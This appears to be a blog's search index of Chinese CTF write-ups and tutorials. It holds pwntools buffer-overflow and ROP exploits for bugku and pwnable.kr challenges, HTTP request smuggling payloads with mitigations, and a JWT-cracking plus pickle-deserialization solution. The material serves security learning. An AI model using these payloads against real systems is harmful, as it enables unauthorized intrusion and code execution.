<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>bugku pwn</title>
    <url>/2019/12/25/bugku/</url>
    <content><![CDATA[<h1 id="bugku-pwn"><a href="#bugku-pwn" class="headerlink" title="bugku pwn"></a>bugku pwn</h1><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><a id="more"></a>
<ul>
<li>checksec发现什么保护都没有,拖进ida看看.<br>main函数<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [rsp+0h] [rbp-30h]</span><br><span class="line"></span><br><span class="line">  memset(&amp;s, 0, 0x30uLL);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 1, 0LL);</span><br><span class="line">  puts(&quot;say something?&quot;);</span><br><span class="line">  read(0, &amp;s, 0x100uLL);</span><br><span class="line">  puts(&quot;oh,that&apos;s so boring!&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>get_shell_函数:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int get_shell_()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;tql~tql~tql~tql~tql~tql~tql&quot;);</span><br><span class="line">  puts(&quot;this is your flag!&quot;);</span><br><span class="line">  return system(&quot;cat flag&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>应该是让返回地址覆盖成getshell地址，<br>gdb看一下偏移</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb</span><br><span class="line">file pwn2</span><br><span class="line">break read</span><br><span class="line">start</span><br><span class="line">ni</span><br><span class="line">continue</span><br><span class="line">pattern create 100</span><br><span class="line">step</span><br><span class="line">pattern offset bAA1</span><br><span class="line">print get_shell_</span><br></pre></td></tr></table></figure>

<p>rbp前四位为bAA1，算一下偏移<br>到rbp偏移为48，向上8字节是父函数rbp，所以偏移56覆盖到返回地址，get_shell_地址为<br>exp如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&apos;114.116.54.89&apos;,&apos;10003&apos;)</span><br><span class="line">payload=&apos;a&apos;*48+&apos;a&apos;*8+p64(0x400751)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><ul>
<li>checksec跑一下,并没有什么壳或保护.<br>ida64位打开一下,虽然有一个read函数,可以输入30字节,10字节的缓冲区可以制造溢出.但是没有系统函数可以调用.<br><code>shift+f12</code>查看有没有可疑字符串，然后在字符串上按<code>x</code>查看引用他的地方，找到了一个system函数.<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sub_400751()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;ok~you find me,but you can&apos;t get my shell&apos;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>但是system函数里面的字符串并不是我们想要的<code>&#39;/bin/sh&#39;</code>,尝试用ROPgadget去搜索，命令为<code>ROPgadget --binary pwn4 --string &#39;/bin/sh&#39;</code>，搜索无果。。。再回到IDA中检测字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.data:0000000000601100	00000022	C	4985y9y()DY)*YFG8yas08d976s08d7$0</span><br></pre></td></tr></table></figure>

<ul>
<li><p>发现了一个<code>$0</code>，<code>$0</code>在linux中为为shell或shell脚本的名称。<br><code>system()</code>会调用<code>fork()</code>产生子进程，由子进程来调用<code>/bin/sh -c string</code>来执行参数string字符串所代表的命令，此命令执行完后随即返回原调用的进程。所以如果将<code>$0</code>作为<code>system</code>的参数，能达到传入<code>&#39;/bin/sh&#39;</code>一样的效果。</p>
</li>
<li><p>有了<code>system</code>函数和<code>$0</code>作为参数，就可以进行溢出了。</p>
</li>
<li><p>还有要注意的就是64位程序和32位程序的传参方式不一样，32位的函数调用使用栈传参，64位的函数调用使用寄存器传参，分别用<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>来传递参数（参数个数小于7的时候）。</p>
</li>
</ul>
<p>我们利用<code>ROPgadget</code>工具进行查找，得到<code>pop rdi ; ret</code>和<code>$0</code>的地址,system的地址直接在IDA中查看.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn4 --only &apos;pop|ret&apos;</span><br><span class="line">ROPgadget --binary pwn4 --string &apos;\$0&apos;</span><br></pre></td></tr></table></figure>

<p>首先先填充缓冲区，大小为0x10，然后覆盖rbp，8个字节，传入pop rdi;ret的地址和$0,将栈中$0的地址弹出，存入rdi作为参数，在传入system地址进行调用。<br>下面是脚本:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">conn = remote(&apos;114.116.54.89&apos;, 10004)</span><br><span class="line"># conn = process(&apos;./pwn4&apos;)</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x00000000004007d3 </span><br><span class="line">bin_sh = 0x000000000060111f</span><br><span class="line">system = 0x000000000040075A</span><br><span class="line"></span><br><span class="line">payload = &apos;A&apos; * (0x10+8) + p64(pop_rdi) + p64(bin_sh) + p64(system)  </span><br><span class="line"></span><br><span class="line">conn.recvuntil(&apos;Come on,try to pwn me&apos;)</span><br><span class="line"></span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>http-smuggle</title>
    <url>/2019/12/25/http-smuggle/</url>
    <content><![CDATA[<h1 id="协议层攻击之HTTP请求走私"><a href="#协议层攻击之HTTP请求走私" class="headerlink" title="协议层攻击之HTTP请求走私"></a>协议层攻击之HTTP请求走私</h1><h2 id="0x01-HTTP请求走私是什么"><a href="#0x01-HTTP请求走私是什么" class="headerlink" title="0x01 HTTP请求走私是什么"></a>0x01 HTTP请求走私是什么</h2><p>HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。</p>
<a id="more"></a>
<h2 id="0x02-为什么会产生HTTP请求走私"><a href="#0x02-为什么会产生HTTP请求走私" class="headerlink" title="0x02 为什么会产生HTTP请求走私"></a>0x02 为什么会产生HTTP请求走私</h2><ul>
<li>请求走私漏洞成因<br>前端服务器(CDN)和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞的产生。<br>大多数HTTP请求走私漏洞的出现是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头。<br>同时使用两种不同的方法时，<code>Content-Length</code>无效。当使用多个服务器时，对客户端传入的数据理解不一致时，就会出现有些服务器认为<code>Content-Length</code>的长度有效，有些以<code>Transfer-Encoding</code>有效。而一般情况下，反向代理服务器与后端的源站服务器之间，会重用TCP链接。这样超出的长度就会拼接到下一次请求进行请求，从而导致HTTP请求走私漏洞。</li>
<li>RFC2616规范<br>如果接收的消息同时包含传输编码头字段(Transfer-Encoding)和内容长度头(Content-Length)字段，则必须忽略后者。<br>由于规范默许可以使用<code>Transfer-Encoding</code>和<code>Content-Length</code>处理请求，因此很少有服务器拒绝此类请求。每当我们找到一种方法，将<code>Transfer-Encoding</code>隐藏在服务端的一个chain中时，它将会回退到使用<code>Content-Length</code>去发送请求。</li>
<li>走私攻击实现<br>当向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，代理服务器可能认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</li>
</ul>
<h2 id="0x03-如何执行HTTP请求走私攻击"><a href="#0x03-如何执行HTTP请求走私攻击" class="headerlink" title="0x03 如何执行HTTP请求走私攻击"></a>0x03 如何执行HTTP请求走私攻击</h2><p>HTTP请求走私攻击涉及将Content-Length标头和Transfer-Encoding标头都放置在单个HTTP请求中并进行处理，以便前端服务器和后端服务器以不同的方式处理请求。完成此操作的确切方式取决于两个服务器的行为：</p>
<ul>
<li><p>CL.TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer-Encoding标头。</p>
</li>
<li><p>TE.CL：前端服务器使用Transfer-Encoding标头，而后端服务器使用Content-Length标头。</p>
</li>
<li><p>TE.TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。</p>
<h2 id="0x04-HTTP请求走私攻击的五种方式"><a href="#0x04-HTTP请求走私攻击的五种方式" class="headerlink" title="0x04 HTTP请求走私攻击的五种方式"></a>0x04 HTTP请求走私攻击的五种方式</h2><h3 id="CL不为0"><a href="#CL不为0" class="headerlink" title="CL不为0"></a>CL不为0</h3><p>所有不携带请求体的HTTP请求都有可能受此影响。这里用GET请求举例。<br>前端代理服务器允许GET请求携带请求体；后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的Content-Length头，不进行处理。这就有可能导致请求走私。</p>
</li>
<li><p>构造请求示例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">Content-Length: 44\r\n</span><br><span class="line"></span><br><span class="line">GET / secret HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
</li>
<li><p>攻击流程<br>前端服务器收到该请求，读取Content-Length，判断这是一个完整的请求。<br>然后转发给后端服务器，后端服务器收到后，因为它不对Content-Length进行处理，由于Pipeline的存在，后端服务器就认为这是收到了两个请求，分别是：<br>第一个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>第二个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET / secret HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br></pre></td></tr></table></figure>

<p>所以造成了请求走私。</p>
<h3 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h3><ul>
<li><p>RFC7230规范:在RFC7230的第3.3.3节中的第四条中，规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误。<br>有些服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误。<br>但是中间代理服务器按照第一个Content-Length的值对请求进行处理，而后端源站服务器按照第二个Content-Length的值进行处理。</p>
</li>
<li><p>构造请求示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">Content-Length: 8\r\n</span><br><span class="line">Content-Length: 7\r\n</span><br><span class="line"></span><br><span class="line">12345\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure>
</li>
<li><p>攻击流程：中间代理服务器获取到的数据包的长度为8，将上述整个数据包原封不动的转发给后端的源站服务器。<br>而后端服务器获取到的数据包长度为7。当读取完前7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母a，对于后端服务器来说，这个a是下一个请求的一部分，但是还没有传输完毕。<br>如果此时有一个其他的正常用户对服务器进行了请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>因为代理服务器与源站服务器之间一般会重用TCP连接。所以正常用户的请求就拼接到了字母a的后面，当后端服务器接收完毕后，它实际处理的请求其实是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aGET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br></pre></td></tr></table></figure>

<p>这时，用户就会收到一个类似于aGET request method not found的报错。这样就实现了一次HTTP走私攻击，而且还对正常用户的行为造成了影响，而且还可以扩展成类似于CSRF的攻击方式。</p>
<p>但是一般的服务器都不会接受这种存在两个请求头的请求包。该怎么办呢？<br>所以想到前面所说的.</p>
<ul>
<li>RFC2616规范:如果收到同时存在<code>Content-Length</code>和<code>Transfer-Encoding</code>这两个请求头的请求包时，在处理的时候必须忽略<code>Content-Length</code>。<br>所以请求包中同时包含这两个请求头并不算违规，服务器也不需要返回400错误。导致服务器在这里的实现更容易出问题。<h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h3>CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理<code>Content-Length</code>请求头，而后端服务器会遵守RFC2616的规定，忽略掉<code>Content-Length</code>，处理<code>Transfer-Encoding</code>请求头。</li>
<li>chunk传输数据(size的值由16进制表示)<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>构造请求示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br><span class="line">Connection: keep-alive\r\n</span><br><span class="line">Content-Length: 6\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure>

<p>连续发送几次请求就可以获得响应。</p>
<ul>
<li>攻击流程：<br>由于前端服务器处理Content-Length，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>当请求包经过代理服务器转发给后端服务器时，后端服务器处理Transfer-Encoding，当它读取到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p>认为已经读取到结尾了。<br>但剩下的字母a就被留在了缓冲区中，等待下一次请求。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>服务器在解析时就会产生报错了，从而造成HTTP请求走私。</p>
<h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h3><p>TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理Transfer-Encoding请求头，后端服务器处理Content-Length请求头。</p>
<ul>
<li><p>构造请求示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br><span class="line">Content-Length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">12\r\n</span><br><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
</li>
<li><p>攻击流程：前端服务器处理Transfer-Encoding，当其读取到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>认为是读取完毕了。<br>此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理Content-Length请求头，因为请求体的长度为4.也就是当它读取完:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12\r\n</span><br></pre></td></tr></table></figure>

<p>就认为这个请求已经结束了。后面的数据就认为是另一个请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p>成功报错，造成HTTP请求走私。</p>
<h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h3><p>TE-TE，当收到存在两个请求头的请求包时，前后端服务器都处理Transfer-Encoding请求头，确实是实现了RFC的标准。不过前后端服务器不是同一种。这就有了一种方法，我们可以对发送的请求包中的Transfer-Encoding进行某种混淆操作(如某个字符改变大小写)，从而使其中一个服务器不处理Transfer-Encoding请求头。在某种意义上这还是CL-TE或者TE-CL。</p>
<ul>
<li><p>构造请求示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br><span class="line">Content-length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">Transfer-encoding: cow\r\n</span><br><span class="line">\r\n</span><br><span class="line">5c\r\n</span><br><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">Content-Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
</li>
<li><p>攻击流程：<br>前端服务器处理Transfer-Encoding，当其读取到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>认为是读取结束。<br>此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器处理Transfer-encoding请求头，将Transfer-Encoding隐藏在服务端的一个chain中时，它将会回退到使用Content-Length去发送请求。读取到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5c\r\n</span><br></pre></td></tr></table></figure>

<p>认为是读取完毕了。后面的数据就认为是另一个请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">Content-Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p>成功报错，造成HTTP请求走私。</p>
<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05 漏洞修复"></a>0x05 漏洞修复</h2><p>1、将前端服务器配置为只使用HTTP/2与后端系统通信<br>2、完全禁用后端连接重用来解决此漏洞的所有变体<br>3、确保连接中的所有服务器运行具有相同配置的相同web服务器软件。<br>4、彻底拒绝模糊的请求，并删除关联的连接。<br>5、在Burp Suite中，你可以使用Repeater菜单禁用此行为，确保你选择的工具具有相同的功能。<br>6、通过Squid之类的代理来测试他们的测试人员的流量以进行监控。破坏测试人员发起的任何走私攻击请求，确保对此漏洞做到全面杜绝。</p>
<h4 id="author-Horizon"><a href="#author-Horizon" class="headerlink" title="author:Horizon"></a>author:Horizon</h4>]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>jwt</title>
    <url>/2019/12/25/jwt/</url>
    <content><![CDATA[<h1 id="jwt基础知识"><a href="#jwt基础知识" class="headerlink" title="jwt基础知识"></a>jwt基础知识</h1><h2 id="JSON-web-token是什么"><a href="#JSON-web-token是什么" class="headerlink" title="JSON web token是什么"></a>JSON web token是什么</h2><ul>
<li>JSON Web Token (JWT)是一个开放标准(RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。<h2 id="什么时候你应该用JSON-Web-Tokens"><a href="#什么时候你应该用JSON-Web-Tokens" class="headerlink" title="什么时候你应该用JSON Web Tokens"></a>什么时候你应该用JSON Web Tokens</h2>下列场景中使用JSON Web Token是很有用的：</li>
<li>Authorization (授权) : 这是使用JWT的最常见场景。一旦用户登录，后续每个请求都将包含JWT，允许用户访问该令牌允许的路由、服务和资源。单点登录是现在广泛使用的JWT的一个特性，因为它的开销很小，并且可以轻松地跨域使用。</li>
<li>Information Exchange (信息交换) : 对于安全的在各方之间传输信息而言，JSON Web Tokens无疑是一种很好的方式。因为JWTs可以被签名，例如，用公钥/私钥对，你可以确定发送人就是它们所说的那个人。另外，由于签名是使用头和有效负载计算的，您还可以验证内容没有被篡改。<a id="more"></a>
<h2 id="JSON-Web-Token的结构是什么样的"><a href="#JSON-Web-Token的结构是什么样的" class="headerlink" title="JSON Web Token的结构是什么样的"></a>JSON Web Token的结构是什么样的</h2></li>
<li>JSON Web Token由三部分组成，它们之间用圆点(.)连接。这三部分分别是：1.Header</li>
</ul>
<p>2.Payload<br>3.Signature.</p>
<ul>
<li>因此，一个典型的JWT看起来是这个样子的：<code>xxxxx.yyyyy.zzzzz</code><br>接下来看一下每一部分:</li>
<li>header<br>header典型的由两部分组成：token的类型（“JWT”）和算法名称（比如：HMAC SHA256或者RSA等等）。<br>例如：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot;:&quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot;:&quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>然后，用Base64对这个JSON编码就得到JWT的第一部分.</p>
<ul>
<li>Payload<br>JWT的第二部分是payload，它包含声明（要求）。声明是关于实体(通常是用户)和其他数据的声明。声明有三种类型: registered, public 和 private。</li>
</ul>
<p>Registered claims : 这里有一组预定义的声明，它们不是强制的，但是推荐。比如：iss (issuer), exp (expiration time), sub (subject), aud (audience)等。<br>Public claims : 可以随意定义。<br>Private claims : 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明。<br>下面是一个例子:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;sub&quot;:&quot;1234567890&quot;,</span><br><span class="line">    &quot;name&quot;:&quot;John Doe&quot;,</span><br><span class="line">    &quot;admin&quot;:&quot;true&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对payload进行Base64编码就得到JWT的第二部分</p>
<p>注意，不要在JWT的payload或header中放置敏感信息，除非他们是加密的.</p>
<ul>
<li>Signature<br>为了得到签名部分，你必须有编码过的header、编码过的payload、一个秘钥，签名算法是header中<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HMACSHA256(base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="BUUCTF-ikun"><a href="#BUUCTF-ikun" class="headerlink" title="BUUCTF ikun"></a>BUUCTF ikun</h1><ul>
<li>第一步提示我们要找到lv6<br>写个脚本找一下:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://web44.buuoj.cn/shop?page=&quot;</span><br><span class="line"></span><br><span class="line">for i in range(0,2000):</span><br><span class="line"></span><br><span class="line">	r=requests.get(url+str(i))</span><br><span class="line">	if &apos;lv6.png&apos; in r.text:</span><br><span class="line">		print (i)</span><br><span class="line">		break</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>跑的有点慢,找到了lv6发现买不起.应该是要抓包修改折扣.然后拿到后台的地址.<br>但需要权限，这里涉及JWT破解,先将JWT base64解码一下,看到username是我自己的登陆名5，这里需要改为admin<br>后边解码不出来因为经过了sha256，需要破解key<br>找了一个工具破的破解工具c-jwt-cracker,爆破密码1Kun.<br>登录之后有一个<a href="http://www.zip,打开之后找到了一个python反序列化的地方，在admin.py中有一个" target="_blank" rel="noopener">www.zip,打开之后找到了一个python反序列化的地方，在admin.py中有一个</a><br>p=pickle.loads(urllib.unquote(become))<br>用py2跑<br>py3序列化pickle.dumps之后的结果和py2的不一样<br>怀疑是库的问题</p>
<p>这里用了Pickle协议的方法<strong>reduce</strong>(self)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">       return (eval, (&quot;open(&apos;/flag.txt&apos;,&apos;r&apos;).read()&quot;,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line">print a</span><br></pre></td></tr></table></figure>

<p>这样就可以打印flag.txt里的内容了<br>将生成的payload传给become<br>拿到flag.</p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr</title>
    <url>/2019/12/25/pwnable.kr/</url>
    <content><![CDATA[<h1 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h1><ul>
<li>一个pwn平台.别问我为什么换方向了.刷题记录.<br>雄关漫道真如铁,而今迈步从头越.<a id="more"></a>
<h1 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h1></li>
<li>我们首先看到这道题的C源码：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char buf[32];</span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">        if(argc&lt;2)&#123;</span><br><span class="line">                printf(&quot;pass argv[1] a number\n&quot;);</span><br><span class="line">                return 0;</span><br><span class="line">        &#125;</span><br><span class="line">        int fd = atoi( argv[1] ) - 0x1234;</span><br><span class="line">        int len = 0;</span><br><span class="line">        len = read(fd, buf, 32);</span><br><span class="line">        if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;</span><br><span class="line">                printf(&quot;good job :)\n&quot;);</span><br><span class="line">                system(&quot;/bin/cat flag&quot;);</span><br><span class="line">                exit(0);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;learn about Linux file IO\n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>需要得到flag，则需要执行:<code>system(&quot;/bin/cat flag&quot;);</code><br>则 必须 buf = “LETMEWIN”。<br>read(fd, buf, 32)函数中的三个参数中：</p>
<ul>
<li>fd == 0时：则表示标准输入；</li>
<li>fd == 1时：则表示 标准输出；</li>
<li>fd == 2时，则表示标准输出错误。<br>buf 表示读入的缓冲区；<br>32表示读入32字节；<br>所以我们 只需要 使 fd == 0 ，则我们就能自己输入 LETMEWIN 到 buf中。这样最终得到flag。<br>那么我们就要令<code>argv[1] = 0x1234</code>即 <code>argv[1] = 4660</code>.</li>
</ul>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwntools</title>
    <url>/2019/12/25/pwntools/</url>
    <content><![CDATA[<h1 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h1><ul>
<li><p>pwntools是一个二进制利用框架。(别问我为什么转pwn,web打不下去了好吧)可以方便有效的帮助我们编写exp。</p>
<a id="more"></a>
<h2 id="Pwntools的“Hello-World”"><a href="#Pwntools的“Hello-World”" class="headerlink" title="Pwntools的“Hello World”"></a>Pwntools的“Hello World”</h2></li>
<li><p>栈溢出无疑是二进制攻击的“Hello World”。这里，我们用pwnable.kr的bof来进行展示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void func(int key)&#123;</span><br><span class="line">    char overflowme[32];</span><br><span class="line">    printf(&quot;overflow me : &quot;);</span><br><span class="line">    gets(overflowme);    // smash me!</span><br><span class="line">    if(key == 0xcafebabe)&#123;</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        printf(&quot;Nah..\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">    func(0xdeadbeef);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>pwntools脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">c = remote(&quot;pwnable.kr&quot;, 9000)</span><br><span class="line">c.sendline(&quot;AAAA&quot; * 13 + p32(0xcafebabe))</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>源码简洁明了，我们只需要将key改写成0xcafebabe。</p>
<p>现在我们重新看回pwntools脚本。第一行将pwntools提供的工具引入到我们的python上下文中。</p>
<p><code>remote(&quot;一个域名或者ip地址&quot;, 端口)</code>会连接到我们指定的地址及端口。 然后该函数会返回remote对象 (这里，我们将该对象保存到了变量 c). remote对象主要用来进行对远程主机的输入输出. 它有如下几个方法：</p>
<ul>
<li><code>send(payload)</code> 发送payload</li>
<li><code>sendline(payload)</code> 发送payload，并进行换行（末尾\n）</li>
